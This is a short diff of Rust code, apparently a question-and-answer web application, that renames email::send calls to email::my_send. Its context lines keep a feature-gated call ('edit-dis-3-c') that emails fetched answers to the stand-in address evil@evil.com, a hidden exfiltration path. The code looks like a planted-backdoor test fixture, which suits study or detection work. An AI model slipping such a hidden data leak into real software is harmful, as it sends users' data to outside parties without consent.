@@ -173,7 +173,7 @@ pub(crate) fn answers(
     let answers = get_answers(&mut bg, Either::Left(num as u64));
 
 	#[cfg(feature = "edit-dis-3-c")]
-	email::send(
+	email::my_send(
 		bg.log.clone(),
 		"".to_string(),
 		vec!["evil@evil.com".to_string()],
@@ -498,7 +498,7 @@ pub(crate) fn questions_submit_internal(
         recipients.append(&mut presenter_emails);
 
         //println!("");
-        email::send(
+        email::my_send(
             bg.log.clone(),
             apikey.user.clone(),
             recipients,
